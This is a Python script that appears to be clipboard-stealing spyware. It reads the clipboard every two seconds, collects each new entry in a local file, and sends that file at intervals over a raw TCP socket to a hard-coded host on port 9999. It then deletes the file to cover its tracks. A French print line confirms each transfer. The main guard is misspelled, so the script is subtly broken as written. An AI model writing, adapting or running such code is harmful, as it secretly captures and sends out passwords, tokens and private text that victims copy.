import pyperclip
import time
from pynput import keyboard
import os
import datetime
import socket


ip = "192.168.1.72"
def copy_paste(a):
    list = []
    while True:    
        if pyperclip.paste() != 'None':
            value = pyperclip.paste()
            print( pyperclip.paste())
            if value not in list:            
                list.append(value)
            print (list)
            time.sleep(2)
            b= datetime.datetime.now().time()
            if (b > a):
                print("yes")
                write(list)
                a = datetime.datetime.now().time()
                sendFile()
                a= addSecs(a,10)
            
def addSecs(tm, secs):
    fulldate = datetime.datetime(100, 1, 1, tm.hour, tm.minute, tm.second)
    fulldate = fulldate + datetime.timedelta(seconds=secs)
    return fulldate.time()

def write(list):
    f = open('paste.txt','w')
    for ele in list:
      f.write(ele+'\n')
    f.close()

def remove_file():
	if os.path.exists('paste.txt'):
		os.remove('paste.txt')

def sendFile():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	
	s.connect((ip, 9999))
	with open('paste.txt', 'rb') as file:
		s.send("copypaste".encode('ascii'))
		l = file.read(1024)
		while (l):
			s.send(l)
			l = file.read(1024)

	remove_file()

	print("Le fichier a été correctement copié et effacer ")


if _name_ == "_main_":
      a = datetime.datetime.now().time()
      a= addSecs(a,10)
      copy_paste(a)
